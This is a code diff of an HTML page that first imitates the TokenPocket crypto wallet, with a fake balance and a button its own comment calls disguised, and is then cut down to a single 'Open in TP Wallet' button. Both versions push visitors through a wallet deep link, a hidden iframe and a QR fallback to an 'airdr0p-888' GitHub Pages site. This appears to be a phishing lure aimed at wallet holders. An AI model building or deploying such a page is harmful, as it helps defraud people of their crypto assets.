@@ -1,239 +1,57 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-  <meta charset="UTF-8">
+  <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TokenPocket</title>
+  <title>打开 TP 钱包</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      min-height: 100vh;
-      background: #0F172A;
-      color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      overflow: hidden;
+    body,html{margin:0;padding:0;height:100%;background:#0F172A;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;}
+    .btn{
+      padding:16px 40px;
+      font-size:18px;
+      font-weight:600;
+      background:linear-gradient(135deg,#00A3FF,#00C4FF);
+      color:white;
+      border:none;
+      border-radius:16px;
+      box-shadow:0 8px 20px rgba(0,163,255,.4);
+      cursor:pointer;
     }
-
-    /* 顶部状态栏（仿 iOS/Android） */
-    .status-bar {
-      height: 44px;
-      background: #1A2338;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 0 16px;
-      font-size: 14px;
-      position: fixed;
-      top: 0; left: 0; right: 0;
-      z-index: 1000;
-    }
-    .status-bar .time { font-weight: 600; }
-    .status-bar .icons { display: flex; gap: 5px; font-size: 18px; }
-
-    /* 钱包主界面 */
-    .wallet-header {
-      padding: 60px 20px 20px;
-      text-align: center;
-      background: linear-gradient(135deg, #1A2338, #0F172A);
-    }
-    .wallet-logo {
-      width: 60px; height: 60px;
-      margin: 0 auto 12px;
-      background: url('https://tokenpocket.pro/static/logo.png') center/contain no-repeat;
-      filter: drop-shadow(0 0 8px rgba(0,163,255,.6));
-    }
-    .wallet-name {
-      font-size: 20px;
-      font-weight: 600;
-      margin-bottom: 8px;
-    }
-    .wallet-address {
-      font-size: 14px;
-      color: #94A3B8;
-      font-family: monospace;
-      padding: 8px 12px;
-      background: #1E293B;
-      border-radius: 8px;
-      display: inline-block;
-      margin: 12px 0;
-    }
-
-    /* 资产卡片 */
-    .asset-card {
-      background: linear-gradient(135deg, #1E293B, #334155);
-      margin: 20px;
-      border-radius: 16px;
-      padding: 20px;
-      box-shadow: 0 8px 25px rgba(0,0,0,.3);
-    }
-    .asset-amount {
-      font-size: 32px;
-      font-weight: 700;
-      color: #00A3FF;
-      margin-bottom: 8px;
-    }
-    .asset-usd {
-      color: #94A3B8;
-      font-size: 16px;
-    }
-
-    /* 底部导航栏（仿 TP） */
-    .bottom-nav {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      height: 84px;
-      background: #1A2338;
-      display: flex;
-      justify-content: space-around;
-      align-items: center;
-      border-top: 1px solid #334155;
-      padding-bottom: env(safe-area-inset-bottom);
-    }
-    .nav-item {
-      text-align: center;
-      color: #64748B;
-      font-size: 12px;
-    }
-    .nav-item.active {
-      color: #00A3FF;
-    }
-    .nav-item i {
-      font-size: 24px;
-      display: block;
-      margin-bottom: 4px;
-    }
-
-    /* 一键打开按钮（伪装成“浏览器”入口） */
-    .open-dapp-btn {
-      position: fixed;
-      bottom: 100px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 80%;
-      padding: 16px;
-      background: linear-gradient(135deg, #00A3FF, #00C4FF);
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      text-align: center;
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,163,255,.4);
-      z-index: 999;
-      animation: float 2s infinite;
-    }
-    @keyframes float {
-      0%,100% { transform: translateX(-50%) translateY(0); }
-      50% { transform: translateX(-50%) translateY(-8px); }
-    }
-
-    /* 二维码 */
-    .qrcode {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      background: #0F172A;
-      padding: 20px;
-      text-align: center;
-      display: none;
-      border-top: 1px solid #334155;
-    }
-    .qrcode img {
-      width: 160px;
-      border: 6px solid #fff;
-      border-radius: 12px;
-    }
+    .qrcode{margin-top:20px;display:none;text-align:center;}
+    .qrcode img{width:160px;border:6px solid #fff;border-radius:12px;}
   </style>
 </head>
 <body>
 
-  <!-- 状态栏 -->
-  <div class="status-bar">
-    <div class="time">9:41</div>
-    <div class="icons">Network Signal Battery</div>
-  </div>
+<button class="btn" onclick="openTP()">Open in TP Wallet (BSC)</button>
 
-  <!-- 钱包头部 -->
-  <div class="wallet-header">
-    <div class="wallet-logo"></div>
-    <div class="wallet-name">TokenPocket</div>
-    <div class="wallet-address">0x71C7...a1f3</div>
-  </div>
-
-  <!-- 资产卡片 -->
-  <div class="asset-card">
-    <div class="asset-amount">1,688.88</div>
-    <div class="asset-usd">≈ $1,688.88 USD</div>
-  </div>
-
-  <!-- 一键打开 DApp 按钮 -->
-  <div class="open-dapp-btn" id="openBtn">
-    Open DApp Browser (BSC)
-  </div>
-
-  <!-- 底部导航 -->
-  <div class="bottom-nav">
-    <div class="nav-item">
-      <i>Wallet</i>
-      <div>Wallet</div>
-    </div>
-    <div class="nav-item active">
-      <i>Browser</i>
-      <div>Browser</div>
-    </div>
-    <div class="nav-item">
-      <i>Discover</i>
-      <div>Discover</div>
-    </div>
-    <div class="nav-item">
-      <i>Me</i>
-      <div>Me</div>
-    </div>
-  </div>
-
-  <!-- 二维码兜底 -->
-  <div class="qrcode" id="qrcode">
-    <p style="margin-bottom:12px; color:#94A3B8;">未检测到 TP 钱包</p>
-    <img id="qrImg" src="" alt="扫码打开">
-    <p style="margin-top:12px; font-size:14px; color:#64748B;">长按保存 → 在 TP 钱包中扫码</p>
-  </div>
+<div class="qrcode" id="qr">
+  <p>请用 TP 钱包扫码打开</p>
+  <img id="img" src="">
+</div>
 
 <script>
-const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
+const URL = "https://airdr0p-888.github.io/usdt1688/index.html";
 
-function isTPBrowser() {
-  return /tokenpocket|tpdapp/i.test(navigator.userAgent);
-}
-
-function showQR() {
-  document.getElementById('qrcode').style.display = 'block';
-  document.getElementById('qrImg').src = 
-    `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(TARGET_URL)}`;
-}
-
-function openTP() {
-  if (isTPBrowser()) {
-    location.href = TARGET_URL;
-    return;
+function openTP(){
+  if(/tokenpocket|tpdapp/i.test(navigator.userAgent)){
+    location.href=URL; return;
   }
-
-  const params = { url: TARGET_URL, chain: "BSC", source: "web" };
-  const scheme = `tpdapp://open?params=${encodeURIComponent(JSON.stringify(params))}`;
+  const scheme = `tpdapp://open?params=${encodeURIComponent(JSON.stringify({url:URL,chain:"BSC"}))}`;
   location.href = scheme;
 
-  // iOS 增强
-  setTimeout(() => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = scheme;
-    document.body.appendChild(iframe);
-    setTimeout(() => document.body.removeChild(iframe), 2000);
-  }, 300);
+  setTimeout(()=>{ // iOS 增强
+    const f=document.createElement('iframe');
+    f.style.display='none'; f.src=scheme;
+    document.body.appendChild(f);
+    setTimeout(()=>f.remove(),2000);
+  },300);
 
-  // 失败兜底
-  setTimeout(showQR, 3500);
+  setTimeout(()=>{ // 失败出二维码
+    document.getElementById('qr').style.display='block';
+    document.getElementById('img').src=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(URL)}`;
+  },3500);
 }
-
-// 绑定点击
-document.getElementById('openBtn').addEventListener('click', openTP);
 </script>
 
 </body>
